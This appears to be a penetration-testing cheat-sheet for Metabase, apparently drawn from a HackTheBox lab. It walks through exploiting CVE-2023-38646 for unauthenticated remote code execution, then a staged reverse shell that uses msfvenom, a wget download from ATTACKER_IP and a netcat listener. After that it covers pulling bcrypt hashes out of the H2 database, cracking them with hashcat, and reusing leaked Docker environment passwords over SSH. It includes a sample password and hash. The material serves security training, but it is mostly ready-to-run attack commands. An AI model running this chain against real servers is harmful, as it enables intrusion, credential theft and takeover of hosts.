# Metabase

Metabase is an open-source business intelligence tool that connects to databases and provides analytics dashboards.

---

## Discovery

```bash
# Default port
# 3000 - HTTP

# Nmap fingerprint
nmap -sC -sV TARGET -p 3000
# Sign in to Metabase

# Version check - look in page source or API
curl http://TARGET:3000/api/session/properties | jq '.version'
```

---

## CVE-2023-38646 - Pre-Auth RCE via Setup Token

Unauthenticated remote code execution through exposed setup-token endpoint.

**Affected Versions:**
- Open-source: < 0.46.6.1
- Enterprise: < 1.46.6.1

**Reference:** https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/

### Get Setup Token

The setup token is exposed via the properties API endpoint:

```bash
# Extract setup-token
curl http://TARGET:3000/api/session/properties | jq -r '."setup-token"'

# Or with grep
curl -s http://TARGET:3000/api/session/properties | grep -o '"setup-token":"[^"]*"'
# "setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
```

### Exploitation

**POC:** https://github.com/m3m0o/metabase-pre-auth-rce-poc

```bash
git clone https://github.com/m3m0o/metabase-pre-auth-rce-poc.git
cd metabase-pre-auth-rce-poc

# Usage
python3 main.py -u http://TARGET:3000 -t SETUP_TOKEN -c "COMMAND"

# Test with ping
python3 main.py -u http://TARGET:3000 -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "ping -c4 ATTACKER_IP"
```

**Note:** Command injection is blind - no output returned.

### Reverse Shell

Direct reverse shells may not work. Use staged payload:

```bash
# 1. Generate payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=9001 -f elf -o shell.elf

# 2. Host it
python3 -m http.server 8000

# 3. Start listener
nc -nlvp 9001

# 4. Download to target
python3 main.py -u http://TARGET:3000 -t SETUP_TOKEN -c "wget -O /tmp/shell.elf http://ATTACKER_IP:8000/shell.elf"

# 5. Make executable
python3 main.py -u http://TARGET:3000 -t SETUP_TOKEN -c "chmod +x /tmp/shell.elf"

# 6. Execute
python3 main.py -u http://TARGET:3000 -t SETUP_TOKEN -c "/tmp/shell.elf"
```

---

## Post-Exploitation

### Metabase Database

Metabase stores data in H2 database format (not SQLite):

```bash
# Database location
/metabase.db/metabase.db.mv.db
/metabase.db/metabase.db.trace.db

# File type check
file metabase.db.mv.db
# metabase.db.mv.db: data
```

### Extracting Credentials from H2 Database

H2 database can't be opened with sqlite3. Use strings to extract data:

```bash
# Search for password hashes (bcrypt)
strings metabase.db.mv.db | grep -a2 -b2 '\$2'

# Output example:
# metalytics@data.htbJJohnnyISmith
# $2a$10$HnyM8tXhWXhlxEtfzNJE0.z.aA6xkb5ydTRxV5uO5v7IxfoZm08LG
# $c50cd8da-0e37-446a-a87d-6f66f47a3334

# Extract email addresses
strings metabase.db.mv.db | grep -E "@.*\.(com|htb|local)"
```

### Cracking Metabase Password Hashes

Metabase uses bcrypt ($2a$):

```bash
# Save hash
echo '$2a$10$HnyM8tXhWXhlxEtfzNJE0.z.aA6xkb5ydTRxV5uO5v7IxfoZm08LG' > hash.txt

# Identify hash type
hashcat --identify hash.txt
# 3200 | bcrypt $2*$, Blowfish (Unix)

# Crack with hashcat
hashcat -a0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Docker Environment Variables

When Metabase runs in Docker, credentials may be leaked via environment variables:

```bash
# Check environment variables (from shell)
env

# Or via linpeas output - look for:
META_PASS=An4lytics_ds20223#
META_USER=metalytics
MB_DB_PASS=
MB_DB_USER=
MB_LDAP_PASSWORD=
MB_EMAIL_SMTP_PASSWORD=
```

### Container Escape

If running in Docker container, credentials found in ENV vars may work for SSH to host:

```bash
# From container, try SSH to host
ssh metalytics@HOST_IP
# Use password from META_PASS env variable
```

---

## Useful API Endpoints

| Endpoint | Description |
|----------|-------------|
| `/api/session/properties` | Leaks setup-token, version info |
| `/api/user` | List users (requires auth) |
| `/api/database` | List database connections (requires auth) |
| `/api/card` | List saved questions/queries (requires auth) |

---

## Default Credentials

Metabase doesn't have default credentials - initial setup creates admin account.

---

## References

- https://github.com/m3m0o/metabase-pre-auth-rce-poc
- https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
- https://nvd.nist.gov/vuln/detail/CVE-2023-38646
